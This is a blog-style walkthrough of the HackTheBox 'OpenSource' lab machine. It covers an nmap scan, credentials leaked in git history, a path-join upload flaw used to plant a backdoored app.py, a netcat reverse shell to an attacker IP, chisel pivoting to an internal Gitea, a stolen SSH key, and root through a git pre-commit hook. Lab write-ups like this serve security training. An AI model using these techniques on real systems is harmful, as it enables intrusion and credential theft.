---
layout: post
title: HackTheBox - OpenSource
#subtitle: Excerpt from Soulshaping by Jeff Brown
#cover-img: /assets/img/path.jpg
#thumbnail-img: /assets/img/thumb.png
tags: [security, hackthebox, ctf]
gh-repo: Jayden-Lind/HTB-Opensource
---

# HTB - OpenSource walkthrough

<p>OpenSource was a harder than initially thought box, I got lost in some rabbit holes, such as escaping the docker container, the Werkzueg console etc. Even though this box is rated as an "Easy" box I would say this was more of a Medium box, as the previous box, Noter was more simpler than this.</p>

![image](/img/2022/06/OpenSource.png)

## Initial

<p>Let's start with a quick NMAP scan</p>

```
┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ $nmap -sC -sV -p- -oA openssource 10.10.11.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 21:11 AEST
Nmap scan report for 10.10.11.164
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 30 May 2022 11:11:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1360
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel="
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 30 May 2022 11:11:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET, POST
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=5/30%Time=6294A663%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,5FF,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20Py
SF:thon/3\.10\.3\r\nDate:\x20Mon,\x2030\x20May\x202022\x2011:11:31\x20GMT\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:360\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\x20\
SF:x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\
SF:"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n
SF:\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Free!<
SF:/title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/jquer
SF:y-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/stati
SF:c/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<script\
SF:x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>\n\x
SF:20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaround\
SF:.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=
SF:\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20<lin
SF:k\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/boot
SF:strap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hre
SF:f=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\x20\x2
SF:0\x20\x20<link\x20rel=\"")%r(HTTPOptions,CD,"HTTP/1\.1\x20200\x20OK\r\n
SF:Server:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Mon,\x2030\x
SF:20May\x202022\x2011:11:31\x20GMT\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,\x20GET,\x20POST\r\nContent-Len
SF:gth:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYP
SF:E\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<h
SF:tml>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20
SF:http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x2
SF:0\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error
SF:\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Ba
SF:d\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\
SF:x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n
SF:\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.60 seconds

┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ $
```

<p>Lets checkout port 80. We are presented with a normal webpage, which describes an opensource file sharing web program, which allows us to download the source by clicking the blue "Download" button</p>

![image](/img/2022/06/image-7.png){:height="65%" width="65%"}

<p>Further down on the homepage, it allows you to try this out on this externally hosted platform.</p>

![image](/img/2022/06/image-8.png){:height="65%" width="65%"}

<p>After uploading a file, we are presented with a download link to the recently just uploaded file.</p>

![image](/img/2022/06/image.png){:height="65%" width="65%"}

<p>Let's look through the source code and see if we can find anything that sticks out.<br>First thing to take note, is that there is a .git directory present, first need to check if there's any clues in the git log.</p>

```sh
┌─[✗]─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ $git branch
  dev
* public

┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ $git log
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

┌─[✗]─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ $git log
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ $git checkout dev
Switched to branch 'dev'    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial

┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]
└──╼ $git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820 | tail
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://<strong>dev01:Soulless_Developer#2022</strong>@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

<p>Looks like we have a username and password that was used. We will note those creds down for later.</p>

<p>Now lets checkout the source code ourselves, and see if we can find any bugs/exploits. Before we check the code out, let's find out what branch the active instance is running.</p>

<p>The difference between the dev and public branch, is that the "dev" branch you POST and GET files from the /upcloud URI, while on the "public" branch it is just the / (root) URI. From this we can determine that the active branch is actually "dev".</p>

<p>Checking the upload part of the app, `views.py`, we can see how it manages files.</p>

``` python
@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = <strong>os.path.join</strong>(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(<strong>os.path.join</strong>(os.getcwd(), "public", "uploads", path))

```


<p>What's wrong with this code? The issue is with "os.path.join". Reading the docs of <a href="https://docs.python.org/3/library/os.path.html#os.path.join">os.path.join</a>, we can see that if any of the parameters are an absolute path, all other parameters are thrown away. If we are able to set the path as an absolute path (EX: /app/app.py) we should be able to get a file.</p>

<strong>PROBLEM</strong>

<p>When attempting to use an absolute path on the /uploads/ endpoint, the Werkzueg app normalises the path, so /uploads//etc/passwd, just gets normalised to /uploads/etc/passwd. The other avenue is we could upload a file with the filename of an absolute path.</p>

<p>Checking the Dockerfile, we can see the location of where the app would be running, then using this short script I wrote, <a href="https://github.com/Jayden-Lind/HTB-Opensource/blob/main/upload.py">upload.py</a> this will POST this <a href="https://github.com/Jayden-Lind/HTB-Opensource/blob/main/views.py">views.py</a> file, with a filename of "/app/app.py". This gives us 2 new routes, /jayden/&lt;file name>, which will allow us to download any file from the host, then also the route /jayden_cmd/&lt;command>, which will allow us to have RCE on this box. The short upload.py script I wrote will then give us a rudimentary shell on the box.</p>

<p>Now that we have access to this host, we can just escalate to a proper shell, </p>

``` sh
CMD> nc 10.10.14.44 4000 -e /bin/sh

/app $ whoami
root
/app $ hostname
6d796f9974e9
/app $ cat /.dockerenv 
/app $ </code></pre>
```

<p>And we can then see that this is a Docker host. Now that we have access we can check for port 3000, on what service is actually running there. </p>

```
/app # wget 10.10.11.164:3000
Connecting to 10.10.11.164:3000 (10.10.11.164:3000)
saving to 'index.html'
index.html           100% |********************************| 13414  0:00:00 ETA
'index.html' saved
/app # cat index.html | head
<!DOCTYPE html>
<html lang="en-US" class="theme-">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title> Gitea: Git with a cup of tea</title>
        <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19"/>
        <meta name="theme-color" content="#6cc644">
        <meta name="default-theme" content="auto" />
        <meta name="author" content="Gitea - Git with a cup of tea" />
/app # 
```

<p>It's running what looks like Gitea that's listening on 127.0.0.1:3000. To access this properly from our attacking machine, we can look into <a href="https://github.com/jpillora/chisel">Chisel</a> to relay the traffic so we can actually browse this Gitea instance. First just have to copy the binaries across, which is easy with wget and a local http server on our attacking machine. Once across we have to do the below to proxy the traffic.</p>

<strong>Attacking Machine:</strong>
``` sudo chisel server --port 3000 -v --reverse --socks5 ```

<strong>Client Machine:</strong>
``` ./chisel client 10.10.14.44:3000 R:5000:socks ```

<p>Need to then enable Firefox to use the Chisel SOCKS proxy, on localhost on port 5000. We can now see Gitea instance. Now let's try and login with the credentials from the proxy we saw in the git diff.</p>

![image](/img/2022/06/image-9.png){:height="65%" width="65%"}

<p>After successful login, we can see some backup files, and inside the .ssh folder, we find a private key. Pull this private key down to your local machine. </p>

![image](/img/2022/06/image-10.png){:height="65%" width="65%"}

```sh
┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ $cat id_rsa  | head
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
u2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BL
```

<p>Now let's sign in to the host with this new private key. We now have user access, and can get the user flag.</p>

## User owned!

``` sh
┌─[jayden@JD-Desktop]─[~/ctf/openssource]
└──╼ $ssh -i id_rsa dev01@10.10.11.164
Last login: Mon May 16 13:13:33 2022 from 10.10.14.23
dev01@opensource:~$ cat user.txt 
50a9b7e797ac653c0eff40cff4e7262d
dev01@opensource:~$ 
```

<p>Now for root, lets do basic enumeration, with <a href="https://github.com/carlospolop/PEASS-ng">linPEAS</a>, and also <a href="https://github.com/DominicBreuker/pspy">pspy</a></p>

<p>linPEAS gave us no quick and easy Priv Esc, but with pspy, we can see that a script under the root user is called that calls git in the dev01 users home directory.</p>

``` 
2022/05/31 10:43:01 CMD: UID=0    PID=10614  | /bin/bash /usr/local/bin/git-sync 
2022/05/31 10:43:01 CMD: UID=0    PID=10613  | /bin/sh -c /usr/local/bin/git-sync 
2022/05/31 10:43:01 CMD: UID=0    PID=10612  | /usr/sbin/CRON -f 
2022/05/31 10:43:01 CMD: UID=0    PID=10615  | git status --porcelain 
2022/05/31 10:43:01 CMD: UID=0    PID=10617  | git add . 
2022/05/31 10:43:01 CMD: UID=0    PID=10620  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
2022/05/31 10:53:01 CMD: UID=0    PID=4095   | git commit -m Backup for 2022-05-31 
2022/05/31 10:43:01 CMD: UID=0    PID=10619  | git push origin main 
dev01@opensource:~$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

<p>This looks to be the way to get the root flag. How would we get this from a root script calling git? </p>

<p>We can look at <a href="https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/">Git Hooks</a>. We can create a pre-commit hook, that code will then be executed before git commit is even ran. Let's create our own quick script that copies the flag to /tmp. (We could create a reverse shell and then have a full shell running as root, but went the quicker route)</p>

``` sh
dev01@opensource:~$ vi /home/dev01/.git/hooks/pre-commit
#!/bin/bash
cp /root/root.txt /tmp/tmp.txt
chmod 777 /tmp/tmp.txt
```

<p>Watch using the pspy binary for the next cronjob of this to run, and then check /tmp/tmp.txt to find the flag</p>

``` sh
dev01@opensource:/tmp$ cat /tmp/tmp.txt 
1e98fe0be2c9197fa6c1fcb965f82b5a
dev01@opensource:/tmp$ 
```

## Root owned!

